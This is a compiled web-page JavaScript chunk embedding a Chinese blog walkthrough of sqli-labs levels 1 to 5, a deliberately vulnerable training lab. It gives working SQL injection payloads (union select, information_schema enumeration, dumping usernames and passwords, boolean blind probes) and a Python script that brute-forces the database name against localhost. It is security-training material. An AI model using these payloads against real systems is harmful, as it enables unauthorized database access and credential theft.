import{_ as e,V as s,W as a,a0 as n}from"./framework.11bf0923.js";const i="/images/sqli-labs-less1-1.png",t="/images/sqli-labs-less1-2.png",d="/images/sqli-labs-less1-3.png",c="/images/sqli-labs-less1-4.png",o="/images/sqli-labs-less1-5.png",l="/images/sqli-labs-less1-6.png",r="/images/sqli-labs-less1-7.png",p={},u=n(`<h1 id="sqli-labs刷题记录" tabindex="-1"><a class="header-anchor" href="#sqli-labs刷题记录" aria-hidden="true">#</a> sqli-labs刷题记录</h1><h2 id="less1" tabindex="-1"><a class="header-anchor" href="#less1" aria-hidden="true">#</a> Less1</h2><p>根据提示<code>Please input the ID as parameter with numeric value</code>添加请求参数<code>?id=1</code>，页面正常返回。</p><h4 id="使用order-by猜解数据表列数" tabindex="-1"><a class="header-anchor" href="#使用order-by猜解数据表列数" aria-hidden="true">#</a> 使用order by猜解数据表列数</h4><p>对id值用<code>&#39;</code>闭合，构造如下order by猜解列数</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?id=1&#39; order by x --+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>--</code>表示注释，<code>+</code>表示空格。不断增加x的值直到页面报错，报错前的x值即为数据表的列数。此处x=4时页面报错，故数据表的列数为3。</p><h4 id="union联合查询" tabindex="-1"><a class="header-anchor" href="#union联合查询" aria-hidden="true">#</a> union联合查询</h4><p>构造如下注入语句判断回现值所在的列数。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?id=1&#39; and 1=2 union select 1,2,3 --+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>页面返回如下<br><img src="`+i+'" alt="union联合查询" loading="lazy"> 表明在数据表中第二列为用户名，第三列为密码。在上述注入语句中替换2或者3位置的值将被显示在页面中。例如<code>version()</code>显示数据库的版本，<code>database()</code>显示数据的名字，<code>user()</code>显示数据库用户， <code>@@version_compile_os</code>显示操作系统的信息。<br><img src="'+t+'" alt="result" loading="lazy"><img src="'+d+'" alt="result" loading="lazy"></p><h4 id="查询所有数据库" tabindex="-1"><a class="header-anchor" href="#查询所有数据库" aria-hidden="true">#</a> 查询所有数据库</h4><p><code>concat_group(字段名)</code>以<code>,</code>连接查询结果。<code>(select group_concat(schema_name) from information_schema.schemata)</code>查询所有数据库。<br><img src="'+c+`" alt="result" loading="lazy"></p><h4 id="查询某个数据库的表名" tabindex="-1"><a class="header-anchor" href="#查询某个数据库的表名" aria-hidden="true">#</a> 查询某个数据库的表名</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>查询<code>security</code>数据库中的表名。<br><img src="`+o+`" alt="result" loading="lazy"></p><h4 id="查询某个表中的列名" tabindex="-1"><a class="header-anchor" href="#查询某个表中的列名" aria-hidden="true">#</a> 查询某个表中的列名</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>查询<code>users</code>表的列名。<br><img src="`+l+`" alt="result" loading="lazy"></p><h4 id="查询某个表中的内容" tabindex="-1"><a class="header-anchor" href="#查询某个表中的内容" aria-hidden="true">#</a> 查询某个表中的内容</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>(select group_concat(username) from security.users),(select group_concat(password) from security.users)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>查询<code>users</code>中的用户名和密码。<br><img src="`+r+`" alt="result" loading="lazy"></p><h2 id="less2" tabindex="-1"><a class="header-anchor" href="#less2" aria-hidden="true">#</a> Less2</h2><p>1.<code>order by</code>猜解表的列数，<code>order by 4</code>时页面发生变化，故表的列数为3。<br> 2.<code>id=-1 union select 1,2,3</code>联合查询爆出位置，与Less1的区别是，Less1中的id在单引号中，类似字符型，Less2中id是数字型，故Less1中需要对<code>&#39;</code>闭合，Less2只需报错即可。<br> 3.其他同Less1。</p><h2 id="less3" tabindex="-1"><a class="header-anchor" href="#less3" aria-hidden="true">#</a> Less3</h2><p><code>id=-1&#39;) union select 1,2,3 --+</code></p><h2 id="less4" tabindex="-1"><a class="header-anchor" href="#less4" aria-hidden="true">#</a> Less4</h2><p><code>id=-1&quot;) union select 1,2,3 --+</code></p><h2 id="less5" tabindex="-1"><a class="header-anchor" href="#less5" aria-hidden="true">#</a> Less5</h2><p>当改变<code>url</code>中的<code>id</code>时页面不再回显与id相关的内容，如<code>username</code>、<code>password</code>等，此时考虑盲注。由于<code>id</code>是字符型变量，使用<code>&#39;</code>闭合。<br> 1、布尔盲注。<br> 判断数据库版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?id=1&#39; and left(version(), 1)=5 --+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>判断数据库名： 首先使用<code>length</code>函数爆出数据库名的长度。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?id=1&#39; and length(database())=8 --+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>再使用left函数爆破数据库名。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?id=1&#39; and left(database(), 1)=&#39;s&#39; --+
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>根据<code>left</code>函数的特点，使用下面的脚本爆破数据库名称。</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> string

<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    alpha <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase
    database_name <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> item <span class="token keyword">in</span> alpha<span class="token punctuation">:</span>
            iter_item <span class="token operator">=</span> database_name<span class="token operator">+</span>item
            url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&#39;http://localhost/Less-5/?id=1%27%20and%20left(database(),%20</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">)=\\&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>iter_item<span class="token punctuation">}</span></span><span class="token string">\\&#39;%20--+&#39;</span></span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">&#39;You are in...........&#39;</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                database_name <span class="token operator">+=</span> item
                <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>database_name<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># security</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,37),m=[u];function b(h,v){return s(),a("div",null,m)}const k=e(p,[["render",b],["__file","sqli-labs记录.html.vue"]]);export{k as default};
